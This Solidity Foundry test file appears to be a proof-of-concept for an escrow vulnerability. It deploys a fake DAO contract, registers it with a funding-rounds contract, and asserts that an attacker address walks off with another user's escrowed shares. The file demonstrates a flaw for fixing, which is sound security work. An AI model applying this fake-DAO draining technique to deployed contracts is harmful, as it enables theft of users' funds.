// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {WeeklyRoundsTest} from "./WeeklyRounds.t.sol";

contract FakeTok {
    address public exitExchange;
    address public lockGuard;
    uint256 public totalSupply = 1e18;
    constructor(address ex) { exitExchange = ex; }
    function balanceOf(address) external pure returns (uint256) { return 0; }
}

contract FakeFundingDao {
    FakeTok public shares;
    FakeTok public loot;
    address public payouts;
    address public target;
    uint256 public units;
    constructor(address ex, address target_, uint256 units_) { shares = new FakeTok(ex); loot = new FakeTok(ex); target = target_; units = units_; }
    function votingWeight() external view returns (address) { return address(this); }
    function mandateFactory() external view returns (address) { return address(this); }
    function fundingTerms() external view returns (address) { return address(this); }
    function reserve(address) external view returns (uint256, uint256, address) { return (units, 1, target); }
    function settle(address, uint256) external {}
    function sweep(IERC20 t, address to) external { t.transfer(to, t.balanceOf(address(this))); }
}

contract FakeDaoRealTest is WeeklyRoundsTest {
    function test_fake_dao_steals_real_escrow() public {
        uint256 id = rounds.open(address(dao));
        _sell(id, ANA, 50e18, 10);
        assertEq(shares.balanceOf(address(rounds)), 50e18);
        address mallory = address(0xBAD);
        usd.mint(mallory, 100 * USD);
        vm.startPrank(mallory);
        FakeFundingDao f = new FakeFundingDao(address(rounds), address(shares), 50e18);
        uint256 fid = rounds.openFunding(address(f));
        usd.approve(address(rounds), type(uint256).max);
        rounds.bid(fid, 50e18, 2);
        vm.warp(block.timestamp + 3 days);
        (uint256 s,,) = rounds.clearingStep(fid);
        rounds.settle(fid, s);
        rounds.claim(fid, mallory);
        f.sweep(IERC20(address(usd)), mallory);
        vm.stopPrank();
        assertEq(shares.balanceOf(mallory), 50e18, "stolen");
        assertTrue(shares.transfersLocked());
        emit log_named_uint("attacker net cost (USDC units)", 100 * USD - usd.balanceOf(mallory));
        // Ana's round: settle fails or claim fails
        vm.expectRevert();
        rounds.claim(id, ANA); // not yet void/settled anyway
        vm.warp(block.timestamp + 3 days);
        vm.expectRevert();
        rounds.claim(id, ANA);
    }
}
